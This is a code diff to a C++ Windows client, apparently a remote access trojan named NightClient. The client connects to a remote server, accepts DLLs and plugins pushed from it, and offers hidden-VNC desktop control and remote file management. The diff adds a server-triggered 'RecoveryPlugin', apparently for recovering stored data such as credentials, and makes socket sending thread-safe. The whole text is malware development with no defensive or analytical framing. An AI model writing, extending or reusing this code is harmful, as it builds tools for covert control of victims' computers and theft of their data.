@@ -89,6 +89,7 @@ struct PacketHeader {
 class NightClient {
 private:
     SOCKET sock;
+    HANDLE sendMutex;
     PluginManager pluginMgr;
     bool connected = false;
     string pendingPluginId;
@@ -103,6 +104,7 @@ private:
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
     const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
+    const string RECOVERY_PLUGIN_ID = "RecoveryPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -116,7 +118,9 @@ private:
     void send_data(json data) {
         if (!connected) return;
         string msg = data.dump() + "\r\n";
+        if (sendMutex) WaitForSingleObject(sendMutex, INFINITE);
         send(sock, msg.c_str(), (int)msg.length(), 0);
+        if (sendMutex) ReleaseMutex(sendMutex);
     }
 
     void request_plugin(const string& pluginId, const json& commandToRunAfterLoad = json()) {
@@ -221,9 +225,18 @@ private:
             else if (action == "hvnc_start" || action == "hvnc_stop" || action == "hvnc_run" ||
 					action == "hvnc_quality" || action == "hvnc_mousedown" || action == "hvnc_mouseup" ||
 					action == "hvnc_mousemove" || action == "hvnc_keydown" || action == "hvnc_keyup" ||
-					action == "hvnc_char" || action == "hvnc_doubleclick") {   // ← bu iki eylem eklendi
+					action == "hvnc_char" || action == "hvnc_doubleclick") {
 				execute_hvnc_command(data);
 			}
+            else if (action == "recovery") {
+                if (pluginMgr.isPluginLoaded(RECOVERY_PLUGIN_ID)) {
+                    thread([this]() {
+                        pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
+                    }).detach();
+                } else {
+                    request_plugin(RECOVERY_PLUGIN_ID);
+                }
+            }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
 				string text  = data.value("text", "");
@@ -277,7 +290,6 @@ private:
                                 pluginMgr.executePluginBinary(FILE_MANAGER_PLUGIN_ID, "HandleBinary", sock, payload_vec);
                             } else {
                                 request_plugin(FILE_MANAGER_PLUGIN_ID);
-                                // Note: In a production app, you'd queue this binary packet to run after the plugin loads.
                             }
                         } else if (header->type == PACKET_TYPE_DLL) {
                             cout << "[+] DLL received from server." << endl;
@@ -329,6 +341,10 @@ private:
                                     } else {
                                         pluginMgr.executePlugin(HIDDEN_VNC_PLUGIN_ID, "RunPlugin", sock);
                                     }
+                                } else if (pluginId == RECOVERY_PLUGIN_ID) {
+                                    thread([this]() {
+                                        pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
+                                    }).detach();
                                 }
                             }
 
@@ -379,6 +395,14 @@ private:
     }
 
 public:
+    NightClient() {
+        sendMutex = CreateMutexA(NULL, FALSE, "NightClientSendMutex");
+    }
+
+    ~NightClient() {
+        if (sendMutex) CloseHandle(sendMutex);
+    }
+
     void start(const char* ip, int port) {
         while (true) {
             WSADATA wsa;
